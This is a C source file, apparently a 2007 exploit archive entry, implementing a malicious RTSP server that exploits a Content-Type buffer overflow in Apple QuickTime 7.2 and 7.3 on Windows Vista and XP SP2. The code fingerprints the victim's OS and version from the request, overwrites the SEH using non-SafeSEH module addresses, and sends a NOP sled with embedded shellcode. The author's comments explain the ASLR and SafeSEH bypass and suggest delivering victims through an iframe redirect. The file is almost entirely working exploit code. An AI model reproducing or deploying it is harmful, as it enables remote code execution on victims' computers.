/*
=============================================================
Apple Quicktime (Vista/XP RSTP Response) Remote Code Exec
=============================================================
Discovered by: h07
Author: InTeL
*Tested on:
    - Quicktime 7.3 on Windows Vista, Result: SEH Overwrite, Code Exec
    - Quicktime 7.2 on Windows Vista, Result: SEH Overwrite. Code Exec
 
    - Quicktime 7.3 on Windows XP Pro SP2, Result: SEH Overwrite, Code Exec
    - Quicktime 7.2 on Windows XP Pro SP2, Result: SEH Overwrite, Code Exec
 
 
Notes:
    [*] On Vista the QuickTimePlayer and the .gtx modules dont have ASLR enabled, NO RANDOMIZATION :)
    [*]All the 7.3 and 7.2 DLL modules are SafeSEH enabled, except for the .gtx modules, that is how u bypass the SEH 
    Restrictions in XP and in Vista!! so we use Addys from there.
    [*]There are ALOT of filtered characters so choose your shellcode wisely or you will run into Access Violations
    Since I didnt feel like wasting my time going through all the filtered Characters, go through it yourself.
        - Here are some \x4b, \x59, \x79
    [*]I did hit my shellcode but b/c i havent gone through all the filtered characters i got an Access Violation
    in the shellcode
    [*]Can be easily modified to keep accepting clients with a lil modding, do it yourself u noobs
     
    [***]Here is an example of how to embed a streaming the quicktime redirection to the RTSP exploit.
    http://quicktime.tc.columbia.edu/users/iml/movies/mtest.html
    cough use w/ an iframe cough
  
    Shoutz: UIA, u kno who u ppl are
*/
 
 
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib,"wsock32.lib")
 
int info();
 
#define port 554
 
char header_part1[] = 
"RTSP/1.0 200 OK\r\n"
"CSeq: 1\r\n"
"Date: 0x00 :P\r\n"
"Content-Base: rtsp://0.0.0.0/1.mp3/\r\n"
"Content-Type: ";
 
char header_part2[] =
"Content-Length: ";
 
char body[] = 
"v=0\r\n"
"o=- 16689332712 1 IN IP4 0.0.0.0\r\n" 
"s=MPEG-1 or 2 Audio, streamed by the PoC Exploit\r\n" 
"i=1.mp3\r\n" "t=0 0\r\n" 
"a=tool:ciamciaramcia\r\n" 
"a=type:broadcast\r\n" 
"a=control:*\r\n" 
"a=range:npt=0-213.077\r\n" 
"a=x-qt-text-nam:MPEG-1 or 2 Audio, streamed by the PoC Exploit \r\n" 
"a=x-qt-text-inf:1.mp3\r\n" 
"m=audio 0 RTP/AVP 14\r\n" 
"c=IN IP4 0.0.0.0\r\n" 
"a=control:track1\r\n"; 
 
//Place Your Shellcode here but keep the name
char scode[] =
"\xfc\xbb\x9a\x15\x38\x92\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
"\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x66\xfd\x7c\x92\x96\xfe\xf7"
"\xd7\xaa\x75\x7b\xdd\xaa\x88\x6b\x56\x05\x93\xf8\x36\xb9\xa2\x15"
"\x81\x32\x90\x62\x13\xaa\xe8\xb4\x8d\x9e\x8f\xf5\xda\xd9\x4e\x3f"
"\x2f\xe4\x92\x2b\xc4\xdd\x46\x88\x21\x54\x82\x5b\x76\xb2\x4d\xb7"
"\xef\x31\x41\x0c\x7b\x1a\x46\x93\x90\x2f\x6a\x18\x67\xc4\x1a\x42"
"\x4c\x1e\xde\x4a\x4c\x7a\x6b\xec\x7c\x07\xab\x95\x70\x8c\x6c\x6a"
"\x02\xe2\x70\xdf\x9f\x6a\x81\xf4\xa9\xe1\x11\xba\xaa\xf5\x11\x30"
"\xc2\xc9\x4e\x77\xe5\x51\x27\xfe\xf1\x12\x07\x7b\x52\x7c\x78\xf6"
"\x56\x23\x10\x9f\xa9\x51\xee\xc8\xaa\x82\x9d\x93\x33\x29\x06\x35"
"\xc8\x9f\xa3\xbd\x55\xdf\x2b\x3e\x96\xdf\x2b\x3e\x96";
 
 
int main(int argc, char *argv[])
{
    char evilbuf[5200], recvbuf[512];
    char *strptr = NULL;
    char contentlength[] = "327";
    int i, pos;
    struct sockaddr_in saddr;
    WSADATA wsaData;
    SOCKET sock, vicsock;
 
    info();
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
        printf("Unable to initialize Winsock \n");
        exit(1);
    }
 
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket Error \n");
        WSACleanup();
        exit(1);
    }
 
    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;    
    saddr.sin_port = htons(port);
 
    if (bind(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR) {
        printf("Bind Error \r\n");
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
 
   if((listen(sock, SOMAXCONN)) == SOCKET_ERROR) {
        printf("Listen Error \r\n"); 
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    printf("[+] Listening on port: %d\r\n", port);
    if((vicsock = accept(sock, NULL, NULL)) != INVALID_SOCKET) {
 
        printf("[+]Victim Connected \r\n"); 
        memset(recvbuf,0,sizeof(recvbuf));
        recv(vicsock, recvbuf, 512, 0);
     
        memset(evilbuf, '\0', sizeof(evilbuf));
        strcpy(evilbuf, header_part1);
     
        /*Identify Operating System - Goes Through Vista, XP and is able to detect Service Patchs so mod at will*/
             
        if((strptr =strstr(recvbuf, "6.0")) != NULL) {// Vista
            strptr = NULL;
             
            if((strptr =strstr(recvbuf, "7.3")) != NULL) {
                printf("Victim is running Vista and QKTime Version 7.3\r\n");
                pos = strlen(header_part1);
                for(i = 1; i<=991;i++) {
                    evilbuf[pos] = 'A';
                    pos++;
                }
                strcat(evilbuf, "\xeb\x32\x90\x90");
                strcat(evilbuf, "\x54\x49\x64\x67"); //pop ebx-pop-retbis in QuickTimeStreaming.gtx
                pos += 8;
            }
            else {
                strptr = NULL;
                if((strptr =strstr(recvbuf, "7.2")) != NULL) {
                    printf("Victim is running Vista and QKTime Version 7.2\r\n");
                    pos = strlen(header_part1);
                    for(i = 1; i<=987;i++) {
                        evilbuf[pos] = 'A';
                        pos++;
                    }
                    strcat(evilbuf, "\xeb\x32\x90\x90");
                    strcat(evilbuf, "\xb4\x45\x59\x67");//pop ebx-pop-retbis in QuickTimeStreaming.gtx
                    pos += 8;
                }
            }
        }
        else { //Win XP SP2
            strptr = NULL;
            if((strptr = strstr(recvbuf, "5.1")) != NULL) {     
                strptr = NULL;
                if((strptr =strstr(recvbuf, "Pack 2")) != NULL) {
                    strptr = NULL;
                    if((strptr =strstr(recvbuf, "7.3")) != NULL) {
                        printf("Victim is running XP SP2 and QKTime Version 7.3\r\n");
                        pos = strlen(header_part1);
                        for(i = 1; i<=991;i++) {
                            evilbuf[pos] = 'A';
                            pos++;
                        }
                        strcat(evilbuf, "\xeb\x32\x90\x90");
                        strcat(evilbuf, "\x54\x49\x64\x67"); //pop ebx-pop-retbis in QuickTimeStreaming.gtx
                        pos += 8;
                    }
                    else{ 
                        strptr = NULL;
                        if((strptr =strstr(recvbuf, "7.2")) != NULL) {
                            printf("Victim is running XP SP2 and QKTime Version 7.2\r\n");
                            pos = strlen(header_part1);
                            for(i = 1; i<=987;i++) {
                                evilbuf[pos] = 'A';
                                pos++;
                            }     
                            strcat(evilbuf, "\xeb\x32\x90\x90");
                            strcat(evilbuf, "\xb4\x45\x59\x67");//pop ebx-pop-retbis in QuickTimeStreaming.gtx
                            pos += 8;
                        }
                    }
                }
            }
            else {
                printf("[-] Not a Valid Target, Shutting Down");
                closesocket(vicsock);
                closesocket(sock);
                WSACleanup();
                exit(1);
            }
        }
         
        for(i=0; i<200;i++) {
            evilbuf[pos] = '\x90';
            pos++;
        }
        for(i=0; i<strlen(scode);i++){
            evilbuf[pos] = scode[i];
            pos++;
        }
        int rest = 4096-(200+strlen(scode));
        for(i=0; i<rest;i++) {
            evilbuf[pos] = '\x90';
            pos++;
        }
     
     
        strcat(evilbuf, "\r\n");
        pos +=2;
        for(i = 0; i<sizeof(header_part2);i++) {
            evilbuf[pos] = header_part2[i];
            pos++;
        }
        strcat(evilbuf, contentlength);
        strcat(evilbuf, "\r\n");
        Sleep(1);
        strcat(evilbuf, "\r\n");
        pos +=8;
        strcat(evilbuf, body);
        printf("%s", evilbuf);
     
        printf("[+] Evil Packet Generated \r\n");
        if(send(vicsock, evilbuf, strlen(evilbuf), 0) != SOCKET_ERROR)
            printf("[+] Evil Packet Sent \r\n");     
        else     
            printf("[-] Evil Packet Sending Failed \r\n");
     
        closesocket(vicsock);
        closesocket(sock);
        WSACleanup();
    }
    else {
        printf("Accept failed");
        closesocket(sock);
        WSACleanup();
    }
        return 0;
}
 
 
int info()
{
    printf("[+]Apple Quicktime (Vista/XP Sp2 RTSP RESPONSE) Code Exec Exploit\r\n");
    printf("[+]Author: InTeL\r\n");
    printf("[+]Tested on:\r\n\t- Quicktime 7.3 on Windows Vista, Result: SEH Overwrite, Code Exec\r\n\t- Quicktime 7.2 on Windows Vista, Result: SEH Overwrite. Code Exec\r\n\t- Quicktime 7.3 on Windows XP Pro SP2, Result: SEH Overwrite, Code Exec\r\n\t- Quicktime 7.2 on Windows XP Pro SP2, Result: SEH Overwrite, Code Exec\r\n");
    printf("[+]Shout to: UIA, you kno who u ppl are\r\n\r\n");
 
    return 0;
}

// milw0rm.com [2007-11-24]
